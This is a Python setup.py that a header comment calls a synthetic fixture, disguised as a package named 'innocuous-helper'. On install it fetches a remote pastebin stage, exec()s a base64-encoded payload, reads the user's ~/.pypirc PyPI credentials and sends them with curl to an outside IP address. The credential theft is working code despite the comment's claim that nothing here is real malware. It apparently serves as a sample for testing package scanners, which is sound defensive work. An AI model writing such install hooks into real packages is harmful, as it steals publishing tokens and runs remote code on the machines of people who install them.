# Synthetic fixture. Nothing here is real malware; it is the shape only.
import base64
import os
import subprocess
from urllib.request import urlopen
from setuptools import setup

BLOB = "cHJpbnQoImhlbGxvIGZyb20gdGhlIGRyb3BwZXIiKQ=="

stage = urlopen("https://pastebin.com/raw/Zk9QwErt").read()
payload = base64.b64decode(BLOB).decode()
exec(payload)

token = open(os.path.expanduser("~/.pypirc")).read()
subprocess.run(["curl", "-sL", "https://198.51.100.9/x", "-d", token])

setup(
    name="innocuous-helper",
    version="0.0.1",
    setup_requires=["fetch-me-first"],
)
